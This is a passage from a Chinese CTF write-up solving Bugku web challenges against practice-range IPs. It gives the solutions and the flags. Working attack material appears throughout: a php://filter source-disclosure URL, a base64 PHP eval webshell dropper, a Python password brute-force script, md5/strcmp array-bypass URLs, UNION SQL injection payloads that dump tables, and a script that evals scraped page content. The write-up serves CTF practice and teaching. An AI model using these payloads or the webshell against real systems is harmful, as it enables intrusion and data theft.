)[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]])+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]) 在chrome console 运行。题目说字母大写。CTF{WHATFK}\nWEB4 看看源代码吧\nhttp://120.24.86.145:8002/web4/\n1 2 3 var p1 = \u0026#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62\u0026#39;; var p2 = \u0026#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b\u0026#39;; eval(unescape(p1) + unescape(\u0026#39;%35%34%61%61%32\u0026#39; + p2)); 在chrome console 运行\n1 2 3 var p1 = \u0026#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62\u0026#39;; var p2 = \u0026#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b\u0026#39;; unescape(p1) + unescape(\u0026#39;%35%34%61%61%32\u0026#39; + p2); 得到\n1 2 3 4 5 6 7 8 9 10 function checkSubmit(){ var a=document.getElementById(\u0026#34;password\u0026#34;); if(\u0026#34;undefined\u0026#34;!=typeof a){ if(\u0026#34;67d709b2b54aa2aa648cf6e87a7114f1\u0026#34;==a.value) return!0; alert(\u0026#34;Error\u0026#34;); a.focus();return!1 } } document.getElementById(\u0026#34;levelQuest\u0026#34;).onsubmit=checkSubmit; 填入67d709b2b54aa2aa648cf6e87a7114f1 。KEY{J22JK-HS11}\nflag在index里 http://120.24.86.145:8005/post/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //使用php的filter读取源码 //http://120.24.86.145:8005/post/index.php?file=php://filter/convert.base64-encode/resource=index.php \u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Bugku-ctf\u0026lt;/title\u0026gt; \u0026lt;?php error_reporting(0); if(!$_GET[file]){echo \u0026#39;\u0026lt;a href=\u0026#34;./index.php?file=show.php\u0026#34;\u0026gt;click me? no\u0026lt;/a\u0026gt;\u0026#39;;} $file=$_GET[\u0026#39;file\u0026#39;]; if(strstr($file,\u0026#34;../\u0026#34;)||stristr($file, \u0026#34;tp\u0026#34;)||stristr($file,\u0026#34;input\u0026#34;)||stristr($file,\u0026#34;data\u0026#34;)){ echo \u0026#34;Oh no!\u0026#34;; exit(); } include($file); //flag:flag{edulcni_elif_lacol_si_siht} ?\u0026gt; \u0026lt;/html\u0026gt; phpcmsV9 一个靶机而已，别搞破坏。 多谢各位大侠手下留情，flag在根目录里txt文件里 http://120.24.86.145:8001/\n1 2 3 4 5 6 网站已经浑身是马了,随意找一个 //view-source:http://120.24.86.145:8001/html/special/test000/ \u0026lt;?php file_put_contents(\u0026#39;tiny.php\u0026#39;,base64_decode(\u0026#39;PD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==\u0026#39;)); ?\u0026gt; //\u0026lt;?php @eval($_POST[pass]);?\u0026gt; 菜刀连上后拿到一张[flag.jpg](http://120.24.86.145:8001/flag.jpg)， 图片末尾隐藏有字符串 flag{admin_a23-ae2132_key} 海洋CMS 地址：http://120.24.86.145:8008/\nflag在根目录某个txt里\n扫到flag.php，flag{felege-ctf-2017_04}。\n输入密码查看flag http://120.24.86.145:8002/baopo/\n作者：Se7en\n直说爆破了，用burp的intruder，Payload Position选pwd=§1§§1§§1§§1§§1§ ，Attack Type选Cluster bomb，payload option选数字，共十万种可能，慢慢等。也可以写个小脚本跑跑。最后密码是13579。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #coding:utf8 import requests,itertools,string u=\u0026#34;http://120.24.86.145:8002/baopo/\u0026#34; d=string.digits req=requests.session() cnt=0 for i in itertools.product(d,d,d,d,d): data={\u0026#34;pwd\u0026#34;:\u0026#39;\u0026#39;.join(i)} r=req.post(u,data=data) cnt=cnt+1 if \u0026#34;密码不正确\u0026#34; not in r.content: print \u0026#34;correct,\u0026#34;,data if cnt%1000==0: print cnt flag{bugku-baopo-hah}\n前女友 http://47.93.190.246:49162/ flag格式：SKCTF{xxxxxxxxxxxxxxxxxx}\n1 2 3 4 5 6 7 8 9 10 11 12 13 //http://47.93.190.246:49162/code.txt \u0026lt;?php if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ $v1 = $_GET[\u0026#39;v1\u0026#39;]; $v2 = $_GET[\u0026#39;v2\u0026#39;]; $v3 = $_GET[\u0026#39;v3\u0026#39;]; if($v1 != $v2 \u0026amp;\u0026amp; md5($v1) == md5($v2)){ if(!strcmp($v3, $flag)){ echo $flag; } } } ?\u0026gt; http://47.93.190.246:49162/?v1[]=\u0026amp;v2[]=1\u0026amp;v3[]=\n向md5()或strcmp()传入数组会返回null，null为假。\nSKCTF{Php_1s_tH3_B3St_L4NgUag3}\n点击一百万次 http://120.24.86.145:9001/test/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;script\u0026gt; var clicks=0 $(function() { $(\u0026#34;#cookie\u0026#34;) .mousedown(function() { $(this).width(\u0026#39;350px\u0026#39;).height(\u0026#39;350px\u0026#39;); }) .mouseup(function() { $(this).width(\u0026#39;375px\u0026#39;).height(\u0026#39;375px\u0026#39;); clicks++; $(\u0026#34;#clickcount\u0026#34;).text(clicks); if(clicks \u0026gt;= 1000000){ var form = $(\u0026#39;\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt;\u0026#39; + \u0026#39;\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;clicks\u0026#34; value=\u0026#34;\u0026#39; + clicks + \u0026#39;\u0026#34; hidden/\u0026gt;\u0026#39; + \u0026#39;\u0026lt;/form\u0026gt;\u0026#39;); $(\u0026#39;body\u0026#39;).append(form); form.submit(); } }); }); \u0026lt;/script\u0026gt; JavaScript代码表示当clicks大于1M时post一个数据包，所以直接post clicks=1000001 得到flag{Not_C00kI3Cl1ck3r} 。\n备份是个好习惯 http://120.24.86.145:8002/web16/\n听说备份是个好习惯\n扫到index.php.bak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once \u0026#34;flag.php\u0026#34;; ini_set(\u0026#34;display_errors\u0026#34;, 0); $str = strstr($_SERVER[\u0026#39;REQUEST_URI\u0026#39;], \u0026#39;?\u0026#39;); $str = substr($str,1); $str = str_replace(\u0026#39;key\u0026#39;,\u0026#39;\u0026#39;,$str); parse_str($str); echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) \u0026amp;\u0026amp; $key1 !== $key2){ echo $flag.\u0026#34;取得flag\u0026#34;; } ?\u0026gt; 访问http://120.24.86.145:8002/web16/?kkeyey1[]\u0026amp;kkeyey2[]=1 得到Bugku{OH_YOU_FIND_MY_MOMY}\n成绩单 快来查查成绩吧 http://120.24.86.145:8002/chengjidan/\n简单的sql注入\n1 2 3 4 5 6 7 8 9 10 url:http://120.24.86.145:8002/chengjidan/index.php post: id=2\u0026#39; and 1=0 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()# //fl4g,sc id=2\u0026#39; and 1=0 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c3467# //skctf_flag id=2\u0026#39; and 1=0 union select 1,2,3,skctf_flag from fl4g# //BUGKU{Sql_INJECT0N_4813drd8hz4} 秋名山老司机 http://120.24.86.145:8002/qiumingshan/\n1 2 3 4 5 6 import requests,re u=\u0026#34;http://120.24.86.145:8002/qiumingshan/\u0026#34; r=requests.session() res=eval(re.findall(\u0026#34;\u0026lt;div\u0026gt;(.*)=\u0026#34;,r.get(u).content)[0]) print r.post(u,data={\u0026#34;value\u0026#34;:str(res)}).content # 